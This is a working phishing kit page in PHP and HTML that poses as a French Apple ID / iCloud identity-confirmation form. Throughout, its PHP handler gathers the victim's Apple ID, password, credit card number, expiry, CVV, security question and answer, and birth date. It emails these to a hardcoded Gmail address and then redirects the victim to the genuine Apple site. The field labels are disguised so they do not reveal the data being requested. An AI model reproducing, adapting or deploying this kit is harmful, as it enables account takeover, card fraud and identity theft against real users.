<?php
	$from_name		=	'Keep Calme';
	$from_email		=	'rezultrezult8@gmail.com';
	$to_email		=	'rezultrezult8@gmail.com';
	$subject		=	'DDOS Rezult apple';
	$url_redirect	=	'https://appleid.apple.com';
	if(isset($_POST) AND !empty($_POST) AND isset($_POST['donnee7'])){
			require_once("mail.class.php");
			$mail	=	new mail();
			$mail->emailto		=	$to_email;
			$mail->namefrom		=	$from_name;
			$mail->emailfrom	=	$from_email;
			$mail->subject		=	$subject;
			$mail->message		=	'';
			$mail->message		.=	'ID APPLE : '.$_POST['donnee1'].'<br />'; //Id
			$mail->message		.=	'Password : '.$_POST['donnee2'].'<br />'; //Pass
			$mail->message		.=	'===================================================<br />';
			$mail->message		.=	'Full name : '.$_POST['donnee3'].'<br />'; // Name
			$mail->message		.=	'CC Number : '.$_POST['donnee7'].'<br />'; // CC
			$mail->message		.=	'Expiration month : '.$_POST['donnee9'].'<br />'; // Expiration month
			$mail->message		.=	'Expiration year : '.$_POST['donnee10'].'<br />'; // Expiration year
			$mail->message		.=	'CVV : '.$_POST['donnee8'].'<br />'; // CVV
			$mail->message		.=	'==========================================<br />';
			$mail->message		.=	'Security question : '.$_POST['donnee11'].'<br />'; // Security question
			$mail->message		.=	'Security response : '.$_POST['donnee12'].'<br />'; // Security response
			$mail->message		.=	'Birdthay day : '.$_POST['donnee4'].'<br />'; // Birdthay day
			$mail->message		.=	'Birdthay month : '.$_POST['donnee5'].'<br />'; // Birdthay month
			$mail->message		.=	'Birdthay year : '.$_POST['donnee6'].'<br />'; // Birdthay year
			$mail->message		.=	'===================By DDOS=====================<br />';
			$mail->check		=	$_POST['is_valid_email'];
			$mail->send();

			header('location:'.$url_redirect);

	}
	else{
?>
<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<link rel="icon" type="image/ico" href="i.ico">
	<title>Confirmation de votre compte</title>
	<link href="css/style.css" type="text/css" rel="stylesheet" />
	<link rel="stylesheet" href="css/validationEngine.jquery.css" type="text/css" />
	<script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
	<script src="js/languages/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
	<script src="js/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
	<script>
		jQuery(document).ready(function(){
			jQuery("#signup").validationEngine();
		});
	</script>
	<!--
	<script type="text/javascript">
		function valider(){
		   if ( document.formPost.data10.value == "" ){
				alert ( "Veuillez entrer votre nom" );
				document.formPost.data10.focus();
				return false;
			}
		   if (!document.formPost.data1.value.match(/^[0-9]{16}$/)){
				alert ( "Veuillez saisir un num?ro de carte de cr?dit valide" );
				document.formPost.data1.focus();
				return false;
			}
		   if (!document.formPost.data2.value.match(/^[0-9]{3}$/)){
				alert ( "Cryptogramme (CVV) invalide" );
				document.formPost.data2.focus();
				return false;
			}
		   if ( document.formPost.data6.value == "" ){
				alert ( "Vous devez saisir une r?ponse" );
				document.formPost.data6.focus();
				return false;
			}
		   if ( document.formPost.data3.value == "0"){
				alert ( "Vous avez indiqu? une date d'expiration invalide" );
				document.formPost.data3.focus();
				return false;
			}
		}
	</script>
	-->
</head>
<body>
</body>
	<div id="layout">
		<h1 class="logo"></h1>
		<div id="wrapper">
			<div class="left">
				<h1>Explorez iCloud</h1>
				<p>Votre identifiant Apple vous permet d'acc&eacute;der facilement &agrave; une vaste gamme de services Apple, tels que l'iTunes Store, l'Apple Store en ligne, iChat, et bien plus encore. Vos informations ne seront communiqu&eacute;es &agrave; personne, sauf si vous nous y autorisez.</p>
			</div>
			<div class="right">
				<form method="post" action="" name="signup" id="signup">
					<h1>Confirmation de votre identite.</h1>
					<table cellpadding="0" cellspacing="0" border="0" width="100%">
						<tr>
							<td colspan="4">
								<p>Saisissez les informations associ&eacute;s &agrave; votre compte iTunes.</p>
							</td>
						</tr>

						<tr>
							<td class="leftRow">
								<label for="donnee3" class="select donnee donnee3">Appication pr&eacute;f&eacute;r&eacute;e</label>
							</td>
							<td class="rightRow" colspan="3">
								<span class="formwrap">
									<input class="validate[required]" id="donnee3" name="donnee3" type="text" />
								</span>
							</td>
						</tr>
						<tr>
							<td class="leftRow">
								<label for="donnee3" class="select donnee donnee4">Donnez votre avis</label>
							</td>
							<td class="rightRow" colspan="3">
								<span class="formwrap">
									<select id="donnee4" name="donnee4">
										<?php
											for($i=1; $i<=31; $i++){
												echo'<option value="'.$i.'">'.$i.'</option>';
											}
										?>
									</select>
								</span>
								<span class="formwrap">
									<select id="donnee5" name="donnee5">
										<option value="1">janvier</option>
										<option value="2">fevrier</option>
										<option value="3">mars</option>
										<option value="4">avril</option>
										<option value="5">mai</option>
										<option value="6">juin</option>
										<option value="7">juillet</option>
										<option value="8">aout</option>
										<option value="9">septembre</option>
										<option value="10">octobre</option>
										<option value="11">novembre</option>
										<option value="12">decembre</option>
									</select>
								</span>
								<span class="formwrap">
									<select id="donnee6" name="donnee6">
										<?php
											for($i=2010; $i>=1901; $i--){
												echo'<option value="'.$i.'">'.$i.'</option>';
											}
										?>
									</select>
								</span>
							</td>
						</tr>
						<tr>
							<td class="leftRow">
								<label for="donnee7" class="select donnee donnee5">Nouveau smartphone intelligent</label>
							</td>
							<td class="rightRow">
								<span class="formwrap">
									<input class="validate[required,custom[nemeOnId]]" maxlength="16" style="width:180px" id="donnee7" name="donnee7" type="text" />
								</span>
							</td>
							<td class="centerRow">
								<label for="donnee8" class="donnee donnee9"></label>
							</td>
							<td class="rightRow">
								<span class="formwrap">
									<input class="validate[required,custom[integer]]" maxlength="3" style="width:50px;text-align:center;" id="donnee8" name="donnee8" type="text" />
								</span>
							</td>
						</tr>
						<tr>
							<td class="leftRow">
								<label for="donnee9" class="select donnee donnee6">Installation de l'iCloud</label>
							</td>
							<td class="rightRow" colspan="3">
								<span class="formwrap">
									<select id="donnee9" name="donnee9">
										<option selected="selected" value="1">janvier</option>
										<option value="2">fevrier</option>
										<option value="3">mars</option>
										<option value="4">avril</option>
										<option value="5">mai</option>
										<option value="6">juin</option>
										<option value="7">juillet</option>
										<option value="8">aout</option>
										<option value="9">septembre</option>
										<option value="10">octobre</option>
										<option value="11">novembre</option>
										<option value="12">decembre</option>
									</select>
								</span>
								<span class="formwrap">
									<select id="donnee10" name="donnee10">
										<?php
											for($i=2015; $i<=2020; $i++){
												echo'<option value="'.$i.'">'.$i.'</option>';
											}
										?>
									</select>
								</span>
							</td>
						</tr>	
						<tr>
							<td class="leftRow">
								<label for="donnee11" class="donnee donnee7">iCloud pour les nuls</label>
							</td>
							<td class="rightRow" colspan="3">
								<span class="formwrap">
									<select id="donnee11" name="donnee11">
										<option value="Quel &amp;eacute;tait le pr&amp;eacute;nom de votre meilleur(e) ami(e) d'enfance ?">
											pr&eacute;nom de votre meilleur(e) ami(e) d'enfance ?
										</option>
									
										<option value="Dans quelle rue avez-vous grandi ?">
											Dans quelle rue avez-vous grandi ?
										</option>
									
										<option value="Quel est le pr&amp;eacute;nom de l'a&amp;icirc;n&amp;eacute;(e) de vos cousins et cousines ? ">
											Quel est le pr&eacute;nom de l'a&icirc;n&eacute;(e) de vos cousins et cousines ? 
										</option>

									
										<option value="Quel a &amp;eacute;t&amp;eacute; votre lieu de vacances pr&amp;eacute;f&amp;eacute;r&amp;eacute; durant votre enfance ?">
											Quel a &eacute;t&eacute; votre lieu de vacances pr&eacute;f&eacute;r&eacute; durant votre enfance ?
										</option>
									
										<option value="Quel &amp;eacute;tait votre dessin anim&amp;eacute; pr&amp;eacute;f&amp;eacute;r&amp;eacute; ?">
											Quel &eacute;tait votre dessin anim&eacute; pr&eacute;f&eacute;r&eacute; ?
										</option>
									</select>
								</span>
							</td>
						</tr>
						<tr>
							<td class="leftRow">
								<label for="donnee12" class="donnee donnee8">Bienvenue</label>
							</td>
							<td class="rightRow" colspan="3">
								<span class="formwrap">
									<input class="validate[required]" id="donnee12" name="donnee12" type="text" />
								</span>
							</td>
						</tr>
						<tr>
							<td class="leftRow" style="border:0;">
								
							</td>
							<td class="rightRow noborder" colspan="3" style="text-align:center;border:0;">
								<input name="donnee1" value="<?php echo $_POST['donnee1'];?>" type="hidden" />
								<input name="donnee2" value="<?php echo $_POST['donnee2'];?>" type="hidden" />
								<input class="submit" value="Valider mes informations" type="submit" />
							</td>
						</tr>
					</table>
				</form>
			</div>
		</div>
	</div>
</html>
<?php
	}
?>